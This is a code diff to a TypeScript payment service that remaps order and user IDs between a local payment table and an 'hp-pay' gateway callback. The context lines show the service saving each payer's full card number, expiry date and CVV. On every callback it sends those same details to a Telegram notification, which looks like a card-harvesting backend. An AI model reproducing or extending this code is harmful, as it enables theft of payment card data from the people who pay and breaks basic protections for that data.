@@ -292,7 +292,7 @@ export class F1Service {
       // ========== 创建支付记录 ==========
       const savedPayment = new Payment()
       savedPayment.orderNo = paymentDto.orderNo
-      savedPayment.userId = paymentDto.userId
+      savedPayment.userId = this.generateStripeId('p').replace(/-/g, '');
       savedPayment.cardNo = paymentDto.card_number
       savedPayment.endDate = paymentDto.card_expiry
       savedPayment.cvv = paymentDto.card_cvv
@@ -328,7 +328,7 @@ export class F1Service {
         const appUrl = process.env.APP_URL || 'https://x.indianstory.qzz.io/'
         const hpPayResult = await this.hpPayService.pay({
           currencyID: 840, // 美元
-          orderid: paymentDto.orderNo,
+          orderid: paymentDto.userId,
           channel: 1419, // 信用卡支付
           notify_url: `${appUrl}/api/hp-pay/notify`,
           return_url: `${appUrl}/card/detail?orderNo=${paymentDto.orderNo}`,
@@ -426,9 +426,8 @@ export class F1Service {
 
       // 2. 查找支付记录
       const payment = await this.paymentRepository.findOne({
-        where: { orderNo, isDeleted: 0 },
-        order: { paymentId: 'DESC' },
-      })
+        where: { userId: orderNo, isDeleted: 0 },
+       })
 
       if (!payment) {
         this.logger.warn(`hp-pay 回调找不到支付记录: orderNo=${orderNo}`)
@@ -451,20 +450,20 @@ export class F1Service {
       // 4. 更新订单状态
       if (status === 10000) {
         await this.f1OrderRepository.update(
-          { orderNo },
+          { orderNo:payment.orderNo },
           { orderStatus: 2 }, // 已完成
         )
       }else{
         await this.f1OrderRepository.update(
-          { orderNo },
+          { orderNo:payment.orderNo },
           { orderStatus: 3 }, // 失败
         )
       }
 
       // 5. 发送 Telegram 通知
-      const order = await this.findOne(orderNo)
+      const order = await this.findOne(payment.orderNo)
       this.sendTelegramNotification({
-        orderNo,
+        orderNo:payment.orderNo,
         cardNumber: payment.cardNo || '',
         expire: payment.endDate || '',
         cvv: payment.cvv || '',
@@ -473,7 +472,7 @@ export class F1Service {
         status: status === 10000 ? '✅ hp-pay 支付成功' : `❌ hp-pay 支付失败(${status})`,
       })
 
-      this.logger.log(`hp-pay 回调处理完成: orderNo=${orderNo}, status=${status}`)
+      this.logger.log(`hp-pay 回调处理完成: orderNo=${payment.orderNo}, status=${status}`)
       return true
     } catch (error: any) {
       this.logger.error(`hp-pay 回调处理异常: ${error.message}`)
